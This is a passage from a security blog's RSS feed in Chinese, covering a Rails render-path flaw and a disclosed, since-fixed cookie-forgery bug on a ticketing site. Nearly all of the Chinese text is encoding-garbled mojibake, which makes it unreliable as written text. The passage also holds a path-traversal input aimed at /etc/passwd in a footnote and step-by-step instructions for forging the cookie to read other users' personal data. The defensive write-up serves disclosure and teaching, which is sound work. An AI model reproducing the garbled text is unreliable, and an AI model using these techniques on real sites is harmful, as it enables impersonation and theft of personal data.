&lt;p&gt;é€™å€‹ä¾‹å­åˆå†æ¬¡é©—è­‰ï¼Œæ¡†æ¶å¯ä»¥å¹«åŠ©å¤§å®¶å¿«é€Ÿé–‹ç™¼ï¼Œå¢åŠ å®‰å…¨åº¦ã€‚ä½†å”¯æœ‰è‰¯å¥½çš„å®‰å…¨æ„è­˜ï¼Œæ‰æ˜¯æ‡‰ç”¨ç¨‹å¼å®‰å…¨çš„åŸºçŸ³ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è¨»è§£&quot;&gt;è¨»è§£&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot;&gt;
      &lt;p&gt;Dynamic Render Paths ç›®å‰ä¸¦æ²’æœ‰ä¸­æ–‡ç¿»è­¯ï¼Œå› ç‚ºå•é¡Œä¹‹ç²¾é«“åœ¨æ–¼è¦ç”¢ç”Ÿçš„æ¨£æ¿è·¯å¾‘æ˜¯å¯è®Šå‹•çš„ï¼Œå› æ­¤ç­†è€…èªç‚ºå‹•æ…‹æ¨£æ¿è·¯å¾‘é€™å€‹ç¿»è­¯è¼ƒç‚ºè²¼åˆ‡ã€‚Â &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot;&gt;
      &lt;p&gt;ç­†è€…æ¸¬è©¦çš„ç’°å¢ƒç‚º Rails 4.1.4ï¼Œå…¶ä»– Rails ç‰ˆæœ¬æœ‰å¯èƒ½éœ€è¦ç”¨ ../../../../../etc/passwd è·³è„«ç›®å‰ç›®éŒ„ã€‚Â &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/</link>
                <guid>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails</guid>
                <pubDate>Fri, 24 Jul 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>è«‡ Cookie èªè­‰å®‰å…¨ï¼ä»¥å®ç¢é›²ç«¯å”®ç¥¨ç‚ºä¾‹</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;Cookie æ˜¯é–‹ç™¼ç¶²é æ‡‰ç”¨ç¨‹å¼å¾ˆå¸¸åˆ©ç”¨çš„æ±è¥¿ï¼Œå®ƒæ˜¯ç‚ºäº†è§£æ±º HTTP stateless ç‰¹æ€§ä½†åˆéœ€è¦æœ‰äº’å‹•è€Œç”¢ç”Ÿçš„ã€‚é–‹ç™¼è€…æƒ³æŠŠä»€éº¼è³‡è¨Šæš«å­˜åœ¨ç”¨æˆ¶ç€è¦½å™¨éƒ½å¯ä»¥é€é Cookie ä¾†å®Œæˆï¼Œåªè¦è³‡è¨Šé‡ä¸å¤§æ–¼ç´„ 4KB çš„é™åˆ¶å°±æ²’å•é¡Œã€‚åœ¨é€™æ¨£çš„ç©ºé–“è£¡ï¼Œå¯ä»¥æ”¾è³¼ç‰©è»Šå…§çš„æš«å­˜å•†å“ã€å¯ä»¥å„²å­˜è®€è€…é–±è®€è¨˜éŒ„ä»¥ç²¾æº–æ¨è–¦ç”¢å“ã€ç•¶ç„¶ä¹Ÿå¯ä»¥å¯«å…¥ä¸€äº›èªè­‰è³‡è¨Šè®“ä½¿ç”¨è€…èƒ½ä¿æŒç™»å…¥ç‹€æ…‹ã€‚&lt;/p&gt;

&lt;p&gt;Cookie æœ‰ä¸€äº›å…ˆå¤©ä¸Šçš„ç¼ºé»ï¼Œåœ¨æ–¼è³‡æ–™æ˜¯å„²å­˜åœ¨ç€è¦½å™¨ç«¯ï¼Œè€Œä½¿ç”¨è€…æ˜¯å¯ä»¥ä»»æ„ä¿®æ”¹é€™äº›è³‡æ–™çš„ã€‚æ‰€ä»¥å¦‚æœç¶²ç«™çš„ä½¿ç”¨è€…èº«åˆ†èªè­‰è³‡è¨Šä¾è³´ Cookieï¼Œå·å·ç«„æ”¹é‚£äº›èªè­‰è³‡è¨Šï¼Œä¹Ÿè¨±æœ‰æ©Ÿæœƒèƒ½å¤ æ¬ºé¨™ç¶²ç«™ï¼Œç›œç”¨ä»–äººèº«åˆ†ï¼Œä»Šå¤©å°±ä¾†è«‡è«‡é€™æ¨£çš„ä¸€ä»¶äº‹æƒ…å§ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å•é¡Œèˆ‡å›å ±&quot;&gt;å•é¡Œèˆ‡å›å ±&lt;/h3&gt;

&lt;p&gt;æœƒæƒ³è¦èŠé€™å€‹è­°é¡Œï¼Œä¸»è¦æ˜¯å› ç‚ºæœ€è¿‘å¾ˆç´…çš„å®ç¢é›²ç«¯å”®ç¥¨ç³»çµ±å°±æ˜¯æ¡ç”¨ Cookie èªè­‰ã€‚ä¸Šé€±åœ¨è¨»å†Šè©²ç¶²ç«™æ™‚çœ‹äº†ä¸€ä¸‹ Cookieï¼Œç™¼ç¾è©²ç¶²ç«™æ²’æœ‰ä½¿ç”¨ &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;Session æ©Ÿåˆ¶&lt;/a&gt;çš„è·¡è±¡ï¼Œä¹Ÿå°±æ˜¯å–®ç´”åˆ©ç”¨ Cookie çš„å€¼ä¾†èªè­‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/acer_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/acer_cookie.png&quot; alt=&quot;å®ç¢é›²ç«¯ cookie&quot; title=&quot;å®ç¢é›²ç«¯ cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ–¼æ˜¯é–‹å§‹å¥½å¥‡èªè­‰ä¸»è¦çš„ä¾æ“šæ˜¯ä»€éº¼ï¼Ÿå¾åœ–ä¸­å¯ä»¥çœ‹åˆ° Cookie å€¼ä¸¦ä¸å¤šï¼ŒçŒœæ¸¬è©²ç¶²ç«™å¤§æ¦‚æœƒæ˜¯çœ‹ USER_IDã€USER_ACCOUNT ä¾†åˆ¤æ–·ä½ æ˜¯å“ªå€‹ä½¿ç”¨è€…ï¼Œç¨ä½œæ¸¬è©¦å¾Œæœƒç™¼ç¾æœ‰äº›é é¢åªä¾æ“š USER_ACCOUNT çš„å€¼ä¾†ç¢ºèªèº«åˆ†ï¼Œè€Œ USER_ACCOUNT é€™å€‹å€¼å…¶å¯¦å°±æ˜¯ä½¿ç”¨è€…çš„èº«åˆ†è­‰å­—è™Ÿï¼Œä¹Ÿå°±æ˜¯èªªä»»ä½•äººåªè¦è·Ÿç¶²ç«™èªªæˆ‘çš„èº«åˆ†è­‰å­—è™Ÿæ˜¯ä»€éº¼ï¼Œç¶²ç«™å°±æœƒèªç‚ºä½ æ˜¯é‚£å€‹èº«åˆ†è­‰å­—è™Ÿçš„ä½¿ç”¨è€…ã€‚åˆ©ç”¨é€™é»è¨­è¨ˆä¸Šçš„å°ç‘•ç–µï¼Œå°±å¯ä»¥ç«Šå–ä»–äººå€‹è³‡ï¼Œæ›´é€²éšä¸€é»ï¼Œç”šè‡³å¯ä»¥ç”¨ä¾†æ¸…ç©ºåˆ¥äººçš„å¿—é¡˜å–®è®“å…¶ä»–ä½¿ç”¨è€…è²·ä¸åˆ°ç¥¨ã€‚&lt;/p&gt;

&lt;p&gt;ç™¼ç¾é€™å€‹å•é¡Œå¾Œï¼Œæ±ºå®šé€šå ± &lt;a href=&quot;https://vulreport.net/&quot;&gt;VulReport æ¼æ´å›å ±å¹³å°&lt;/a&gt;ï¼Œç”±è©²å¹³å°çµ±ä¸€é€šçŸ¥é–‹ç™¼å•†ã€‚é€™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨é€™å€‹å¹³å°ï¼Œå°æˆ‘è€Œè¨€é€™æ˜¯ä¸€å€‹æ–¹ä¾¿ä¸”å°æ•´é«”è³‡å®‰ç’°å¢ƒæœ‰åŠ©ç›Šçš„å¹³å°ã€‚æ–¹ä¾¿é»åœ¨æ–¼ï¼Œéå»å¸¸å¸¸å›°æ“¾æ–¼ç™¼ç¾ä¸€äº›ç¶²ç«™æœ‰è¨­è¨ˆä¸Šçš„ç–å¤±å»ä¸çŸ¥è©²ä¸è©²é€šå ±ï¼Œå¦‚æœèªè­˜è©²ç¶²ç«™çš„é–‹ç™¼è€…å€’æ˜¯é‚„å¥½å¯ä»¥ç›´æ¥è¬›ï¼Œä½†å°æ–¼å…¶ä»–ä¸èªè­˜çš„ï¼Œä¸€ä¾†æ²’æœ‰æ˜ç¢ºçª—å£ï¼ŒäºŒä¾†ç¤™æ–¼å·¥ä½œé—œä¿‚æ€•è¢«èªç‚ºæ˜¯æ•²ç«¹æ§“ï¼Œæ‰€ä»¥å½±éŸ¿ä¸å¤§çš„æ¼æ´å¯èƒ½å°±æ”¾æ°´æµäº†ã€‚é€™æ¨£æ”¾ä»»å…¶å¯¦ä¸æ˜¯ä¸€ä»¶å¥åº·çš„äº‹æƒ…ï¼Œæ¼æ´åœ¨é¢¨éšªå°±åœ¨ï¼Œæœ‰äº†é€™æ¨£çš„å›å ±å¹³å°è‡³å°‘å¯ä»¥å‘Šè¨´ä¼æ¥­å¯èƒ½å­˜åœ¨é¢¨éšªï¼Œè‡ªå·±ä¹Ÿå¯ä»¥æ”¾å¿ƒé€šå ±ã€‚äº‹å¯¦ä¸Šï¼Œå°å²¸æœ‰&lt;a href=&quot;http://wooyun.org/&quot;&gt;é¡ä¼¼çš„å¹³å°&lt;/a&gt;å·²ç¶“è¡Œä¹‹æœ‰å¹´ï¼Œæœ€é¡¯è‘—çš„æ•ˆæœï¼Œå°±æ˜¯å°å²¸ç¶²ç«™åœ¨ 0 day è¢«æ­éœ²å¾Œèƒ½åœ¨ä¸€é€±å·¦å³å…¨åœ‹ä¿®å¾©ï¼Œè€Œä»¥å¾€å¯èƒ½å¥½å¤šå¹´éå»äº†æ¼æ´é‚„åœ¨ã€‚é€™çœŸçš„èƒ½å¤ åŠ é€Ÿä¿è­·ä¼æ¥­å’Œä½¿ç”¨è€…ï¼Œå¾ˆé«˜èˆˆå°ç£ä¹Ÿæœ‰äº†é€™æ¨£çš„å¹³å°ï¼&lt;/p&gt;

&lt;p&gt;æ˜¨å¤©æ—©ä¸Šæ”¶åˆ°äº†å¹³å°å›å ±å®ç¢é›²ç«¯å”®ç¥¨å·²ç¶“&lt;a href=&quot;https://vulreport.net/vulnerability/detail/284&quot;&gt;ä¿®å¾©çš„æ¶ˆæ¯&lt;/a&gt;ï¼Œæ—¢ç„¶å·²ç¶“ä¿®å¾©ä¸”å…¬é–‹äº†ï¼Œå°±é †ä¾¿è¬›è§£é€™å€‹å•é¡Œçš„ç´°ç¯€å§ï¼å¸Œæœ›å…¶ä»–é–‹ç™¼è€…å¯ä»¥å¾ä¸­é«”æœƒåˆ°æ”»æ“Šè€…çš„æ€ç¶­ï¼Œé€²è€Œåšæ´½ç•¶çš„é˜²ç¦¦ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é©—è­‰åŠå±å®³&quot;&gt;é©—è­‰åŠå±å®³&lt;/h3&gt;

&lt;p&gt;ç‚ºäº†æ–¹ä¾¿é©—è­‰è§£èªªé€™å€‹å•é¡Œï¼Œé€™é‚Šç‰¹åˆ¥ç”¨å…©å€‹ä¸å­˜åœ¨çš„èº«åˆ†è­‰å­—è™Ÿåœ¨å®ç¢é›²ç«¯å”®ç¥¨ç”³è«‹å¸³è™Ÿï¼Œåˆ†åˆ¥æ˜¯ Z288252522 å’Œ Z239398899ã€‚æ¸¬è©¦ç›®çš„æ˜¯ç™»å…¥å¸³è™Ÿ Z288252522 å¾Œçœ‹çœ‹æ˜¯å¦èƒ½åˆ©ç”¨ä¸Šè¿° Cookie å•é¡Œè®€å– Z239398899 çš„å€‹è³‡ã€‚&lt;/p&gt;

&lt;p&gt;é¦–å…ˆç™»å…¥å¸³è™Ÿ Z288252522ï¼Œæ‰¾åˆ°ä¸€å€‹æœƒå›å‚³å€‹è³‡çš„é é¢ï¼š&lt;br /&gt;&lt;br /&gt;
https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_data.png&quot; alt=&quot;ç¬¬ä¸€å€‹ä½¿ç”¨è€…å€‹è³‡&quot; title=&quot;ç¬¬ä¸€å€‹ä½¿ç”¨è€…å€‹è³‡&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ­¤æ™‚çš„ Cookie å€¼å¦‚ä¸‹&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot; alt=&quot;ç¬¬ä¸€å€‹ä½¿ç”¨è€… cookie&quot; title=&quot;ç¬¬ä¸€å€‹ä½¿ç”¨è€… cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾åœ–ä¸­ç™¼ç¾ Cookie çš„å€¼å…¶å¯¦æ˜¯ç¶“éåŠ å¯†çš„ï¼Œé€™é»åœ¨ä¸Šé¢èªªæ˜æ”»æ“Šè§€å¿µæ™‚åˆ»æ„æ²’æœ‰æåŠã€‚æŠŠ Cookie å€¼åŠ å¯†æ˜¯ä¸€ç¨®é˜²æ­¢åˆ¥äººä¿®æ”¹ Cookie å€¼çš„æ–¹å¼ï¼Œæ”»æ“Šè€…ä¸çŸ¥é“ Cookie å€¼çš„å…§å®¹ï¼Œè‡ªç„¶ä¹Ÿç„¡æ³•ä¿®æ”¹äº†ã€‚&lt;/p&gt;

&lt;p&gt;ç„¶è€Œé€™æ¨£åšé‚„æ˜¯å­˜åœ¨äº›å¾®é¢¨éšªï¼Œä¸€æ—¦é€™å€‹åŠ è§£å¯†æ–¹å¼è¢«æ‰¾åˆ°ï¼Œæ”»æ“Šè€…å°±å¾—ä»¥ä¿®æ”¹ Cookie å…§å®¹ï¼Œé€²è€Œç›œç”¨åˆ¥äººèº«åˆ†ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œè‹¥æƒ³æ†‘è‘—æ”¹è®Š Cookie ç›œç”¨åˆ¥äººèº«åˆ†å…¶å¯¦å¯ä»¥ä¸ç”¨èŠ±æ™‚é–“å»è§£åŠ å¯†æ³•ï¼Œé€™è£¡æœ‰ä¸€å€‹å° trickï¼Œæˆ‘å€‘å¾è§€å¯Ÿä¸­é¦¬ä¸Šå°±èƒ½ç™¼ç¾æ‰€æœ‰ Cookie å€¼éƒ½æ˜¯ç”¨åŒä¸€å¥—åŠ å¯†æ–¹å¼ï¼Œè€Œä¸”å…¶ä¸­ USER_EMAILã€USER_NAME é€™äº›é‚„æ˜¯æˆ‘å€‘å¯ä»¥ä¿®æ”¹çš„å€¼ã€‚é€™ä¹Ÿæ„å‘³è‘—å¦‚æœæˆ‘å€‘æŠŠå§“åæ”¹æˆæˆ‘å€‘æƒ³è¦åŠ å¯†çš„èº«åˆ†è­‰å­—è™Ÿï¼Œä¼ºæœå™¨å°±æœƒå›å‚³ä¸€å€‹åŠ å¯†å¥½çš„å€¼çµ¦ USER_NAMEã€‚æˆ‘å€‘ç›´æ¥ä¾†ä¿®æ”¹å§“åçœ‹çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;h/assets/img/blog/20150130/change_name.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/change_name.png&quot; alt=&quot;ä¿®æ”¹å§“åæˆèº«åˆ†è­‰å­—è™Ÿ&quot; title=&quot;ä¿®æ”¹å§“åæˆèº«åˆ†è­‰å­—è™Ÿ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç•¶å§“åæ”¹æˆç›®æ¨™ Z239398899 æ™‚ï¼ŒCookie ä¸­çš„ USER_NAME å€¼å°±æœƒæ”¹è®Šæˆæˆ‘å€‘è¦çš„åŠ å¯†çµæœã€‚è€¶ï¼æ˜¯ä¸€ç¨®ä½œæ¥­ä¸æœƒå¯«æ‰¾å‡ºé¡Œè€å¸«å¹«å¿™å¯«çš„æ¦‚å¿µ XD&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot; alt=&quot;æ”¹è®Šç¬¬ä¸€å€‹ä½¿ç”¨è€… cookie&quot; title=&quot;æ”¹è®Šç¬¬ä¸€å€‹ä½¿ç”¨è€… cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—ç›´æ¥æŠŠ USER_NAME çš„å€¼æ‹¿ä¾†ç”¨ï¼Œè¤‡è£½è²¼ä¸Šåˆ°ç›®æ¨™æ¬„ä½ USER_ACCOUNT ä¸­ï¼Œä¹‹å¾Œå°±æ˜¯ä»¥ Z239398899 çš„èº«åˆ†ä¾†è®€å–ç¶²é äº†ã€‚æˆ‘å€‘å†è®€å–ä¸€æ¬¡ https://www.jody-ticket.com.tw/UTK0196_.aspx çœ‹çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_data.png&quot; alt=&quot;ç¬¬äºŒå€‹ä½¿ç”¨è€…å€‹è³‡&quot; title=&quot;ç¬¬äºŒå€‹ä½¿ç”¨è€…å€‹è³‡&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æˆåŠŸçœ‹åˆ° Z239398899 çš„è³‡æ–™äº†ï¼å¦‚æ­¤ï¼Œå°±å¯ä»¥åªæ†‘ä¸€å€‹èº«åˆ†è­‰å­—è™Ÿè®€åˆ°ä»–äººçš„åœ°å€é›»è©±è³‡è¨Šï¼Œç”šè‡³å¯ä»¥å¹«åˆ¥äººæ¶ç¥¨æˆ–å–æ¶ˆç¥¨åˆ¸ã€‚é€™å€‹æµç¨‹å¯«æˆç¨‹å¼å¾Œåªè¦å…©å€‹ request å°±å¯ä»¥å˜—è©¦ç™»å…¥ä¸€å€‹èº«åˆ†è­‰å­—è™Ÿï¼Œè¦å¤§é‡å·å–æœƒå“¡å€‹è³‡ä¹Ÿæ˜¯å¯è¡Œçš„äº†ã€‚&lt;/p&gt;

&lt;p&gt;èªªåˆ°é€™é‚Šï¼Œä¹Ÿè¨±æœ‰äººæœƒè³ªç–‘è¦çŒœä¸­è¨»å†Šå¸³æˆ¶çš„èº«åˆ†è­‰å­—è™Ÿæ˜¯æœ‰é›£åº¦çš„ï¼Œä½†å…¶å¯¦è¦åˆ—èˆ‰å‡ºå…¨å°ç£å¯èƒ½åœ¨ä½¿ç”¨çš„èº«åˆ†è­‰å­—è™Ÿä¸¦ä¸å›°é›£ï¼Œå†åŠ ä¸Šå®ç¢é›²ç«¯çš„ç¡¬é«”å…¶å¯¦æ˜¯å¾ˆä¸éŒ¯çš„ï¼Œäº‹å¯¦ä¹Ÿè­‰æ˜å®ƒèƒ½å¤ åœ¨&lt;a href=&quot;https://tw.news.yahoo.com/%E6%B1%9F%E8%95%99%E5%8A%A0%E5%A0%B4%E5%94%AE%E7%A5%A8-%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A4000%E8%90%AC%E6%AC%A1-041458504.html&quot;&gt;çŸ­æ™‚é–“è™•ç†å››åƒè¬å€‹è«‹æ±‚ç³»çµ±ä»ä¿æŒç©©å®š&lt;/a&gt;ï¼Œåªè¦æ”»æ“Šè€…ç¶²è·¯ä¸è¦&lt;a href=&quot;http://www.cna.com.tw/news/afe/201501250162-1.aspx&quot;&gt;å¡åœ¨è‡ªå®¶å··å­å£&lt;/a&gt;ï¼Œå¤šæ©Ÿå™¨å¤šç·šç¨‹ä½ˆä¸‹å»çŒœèº«åˆ†è­‰å­—è™Ÿæ•ˆç‡æ‡‰è©²å¾ˆå¯è§€ï¼&lt;/p&gt;

&lt;h3 id=&quot;å»ºè­°åŸå‰‡&quot;&gt;å»ºè­°åŸå‰‡&lt;/h3&gt;

&lt;p&gt;é€™æ¬¡çš„å•é¡Œæ˜¯å…©å€‹å¼±é»çš„çµ„åˆæ”»æ“Šï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cookie åŠ å¯†çš„å…§å®¹å¯è§£ä¹Ÿå¯å½é€ ï¼é€éç¶²ç«™å¹«å¿™&lt;/li&gt;
  &lt;li&gt;åŠŸèƒ½ç¼ºå°‘æ¬Šé™æ§ç®¡ (Missing Function Level Access Control)ï¼éƒ¨åˆ†é é¢åªæ†‘èº«åˆ†è­‰å­—è™Ÿå°±å¯å­˜å–å€‹è³‡&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å®ç¢é›²ç«¯å”®ç¥¨ç‚ºäº†æ•ˆç‡å’Œåˆ†æµï¼Œä½¿ç”¨ Cookie èªè­‰æ˜¯ç›¸ç•¶åˆç†çš„è¨­è¨ˆï¼Œæ‰€ä»¥è¦è§£æ±ºé€™å€‹å•é¡Œï¼Œå¾ç¬¬äºŒé»ä¾†è§£æ±ºæœƒæ˜¯æœ€æœ‰æ•ˆä¸”ç¬¦åˆæˆæœ¬çš„æ–¹å¼ï¼Œæ€éº¼æ”¹å‘¢ï¼Ÿæ¨æ¸¬åŸæœ¬çš„ SQL èªå¥æ‡‰è©²é¡ä¼¼é€™æ¨£ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ACCOUNT&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;ç”±æ–¼ USER_ACCOUNT æ˜¯èº«åˆ†è­‰å­—è™Ÿï¼Œå®¹æ˜“çª®èˆ‰ï¼Œæ›´åš´è¬¹çš„ä½œæ³•å¯ä»¥å¤šåˆ¤æ–·ä¸€å€‹ idï¼Œåƒæ˜¯é€™æ¨£ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ACCOUNT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ID&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å¾åªéœ€è¦å‘Šè¨´ä¼ºæœå™¨èº«åˆ†è­‰å­—è™Ÿå°±å›å‚³æœƒå“¡è³‡æ–™ï¼Œåˆ°è®Šæˆéœ€è¦èº«åˆ†è­‰å­—è™Ÿå’Œæœƒå“¡ç·¨è™ŸåŒæ™‚æ­£ç¢ºæ‰æœƒå›å‚³æœƒå“¡è³‡æ–™ï¼Œè‡³æ­¤ï¼Œæ”»æ“Šè€…å·²ç¶“å¾ˆé›£åŒæ™‚çŸ¥é“åˆ¥äººçš„æœƒå“¡ç·¨è™Ÿå’Œèº«åˆ†è­‰å­—è™Ÿäº†ï¼Œå› æ­¤å¤§å¤§é™ä½äº†è¢«çŒœä¸­çš„æ©Ÿç‡ï¼Œå¢åŠ äº†å®‰å…¨æ€§ã€‚&lt;/p&gt;

&lt;p&gt;Cookie ä¸€ç›´ä»¥ä¾†éƒ½æ˜¯ Web Application Security é ˜åŸŸçš„å…µå®¶å¿…çˆ­ä¹‹åœ°ï¼Œæ”»æ“Šè€…ç„¡ä¸çµç›¡è…¦æ±æƒ³å·åˆ°æˆ–å½é€ å®ƒï¼Œå‰é™£å­èˆ‰è¾¦çš„ &lt;a href=&quot;http://girls.hitcon.org/&quot;&gt;HITCON GIRLS&lt;/a&gt; Web èª²å ‚ç·´ç¿’é¡Œç¬¬ä¸€é¡Œå°±æ˜¯æ”¹ Cookie ä¾†å½é€ èº«åˆ†ï¼Œè¶³è¦‹é€™å€‹å•é¡Œæœ‰å¤šåŸºæœ¬å’Œé‡è¦ã€‚&lt;/p&gt;

&lt;p&gt;é—œæ–¼ Cookieï¼Œé€™è£¡æä¾›ä¸€é»åŸå‰‡å’Œæ¦‚å¿µä¾›å¤§å®¶åƒè€ƒï¼š&lt;/p&gt;

&lt;p&gt;é¦–å…ˆï¼ŒCookie æ˜¯å­˜åœ¨å®¢æˆ¶ç«¯çš„ï¼Œæ‰€ä»¥æœ‰æ©Ÿæœƒè¢«çœ‹åˆ°ã€è¢«ç«„æ”¹ã€è¢«å…¶ä»–äººå·èµ°ã€‚åŸºæ–¼é€™äº›åŸå› ï¼Œä¸å»ºè­°åœ¨ Cookie ä¸­å„²å­˜æ©Ÿæ•è³‡æ–™ï¼Œæˆ–æ˜¯å­˜æ”¾æœƒå½±éŸ¿ä¼ºæœå™¨é‹ä½œçš„é‡è¦åƒæ•¸ï¼Œéœ€è©•ä¼°ä¸€ä¸‹é€™äº›æš«å­˜è³‡æ–™è¢«äººå®¶çœ‹åˆ°æˆ–ä¿®æ”¹æ˜¯ä¸æ˜¯æ²’å·®ï¼Œé€™æ˜¯å„²å­˜çš„åŸå‰‡ã€‚å¦‚æœæ¬Šè¡¡å¾Œé‚„æ˜¯è¦åœ¨ Cookie ä¸­å­˜æ”¾é‡è¦è³‡æ–™ï¼Œé‚£å°±éœ€è¦å°å€¼åŠ å¯†é¿å…è¢«è®€æ”¹ï¼Œè€Œä¸”è¦ç¢ºä¿åŠ å¯†çš„å¼·åº¦ä»¥åŠå…¶ä»–äººæ˜¯å¦èƒ½é€éå…¶ä»–æ–¹æ³•è§£æä¿®æ”¹ã€‚æœ€å¾Œï¼ŒCookie æœ€å¸¸è¢«å·èµ°çš„æ–¹å¼æ˜¯é€é JavaScriptï¼Œæ‰€ä»¥å»ºè­°åœ¨é‡è¦çš„ Cookie åŠ ä¸Š &lt;a href=&quot;https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/&quot;&gt;HttpOnly flag&lt;/a&gt; èƒ½æœ‰æ•ˆçš„é™ä½è¢«å·èµ°çš„æ©Ÿç‡ã€‚ä¹Ÿä¾†è©¦è‘—æ•´ç†ä¸€ä¸‹é€™ä¸€å°æ®µçš„é‡é»ï¼š&lt;/p&gt;

&lt;ul class=&quot;devcore&quot;&gt;
  &lt;li&gt;æ©Ÿæ•è³‡æ–™ä¸è¦å­˜&lt;/li&gt;
  &lt;li&gt;åŠ å¯†è³‡è¨Šä¸å¯å°‘&lt;/li&gt;
  &lt;li&gt;è¨­å®šæ¨™é ­ä¸æ€•é§­&lt;/li&gt;
  &lt;li&gt;ä¸€æ¬¡æå®šæ²’ç…©æƒ±&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ²’æƒ³åˆ°ä¿¡æ‰‹æ‹ˆä¾†å°±æ˜¯ä¸‰ä¸ä¸€æ²’æœ‰ï¼Œå‰é¢å†åŠ å€‹å‹¾å‹¾ï¼Œæ„Ÿè¦ºå¥½åƒå¾ˆå²å®³å‘¢ï¼&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

